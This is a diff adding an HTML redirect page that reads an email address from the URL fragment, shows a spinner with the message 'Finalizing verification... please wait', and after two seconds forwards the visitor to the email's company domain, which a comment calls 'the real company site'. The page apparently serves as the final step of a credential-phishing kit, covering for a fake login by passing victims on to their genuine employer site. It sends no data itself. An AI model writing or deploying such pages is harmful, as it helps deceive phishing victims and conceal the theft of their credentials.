@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script>
+        window.onload = function() {
+            // Grab the email/domain from the hash
+            var hash = window.location.hash.substr(1);
+            if (hash && hash.includes("@")) {
+                var domain = hash.split("@")[1];
+                // Wait 2 seconds, then redirect to the real company site
+                setTimeout(function() {
+                    window.location.href = "https://www." + domain;
+                }, 2000);
+            }
+        };
+    </script>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div style="text-align:center;">
+        <div class="loader" style="margin: 0 auto 10px;"></div>
+        <p>Finalizing verification... please wait.</p>
+    </div>
+</body>
+</html>
